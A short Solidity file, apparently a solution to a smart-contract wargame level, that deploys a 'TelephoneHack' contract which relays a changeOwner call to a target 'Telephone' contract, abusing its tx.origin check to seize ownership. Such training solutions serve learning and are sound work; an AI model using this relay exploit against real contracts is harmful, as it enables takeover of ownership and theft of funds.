// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneHack {

  Telephone target;

  constructor(address telephone) public {
    target = Telephone(telephone);
  }

  function changeOwner(address _owner) public {
    target.changeOwner(_owner);
  }
}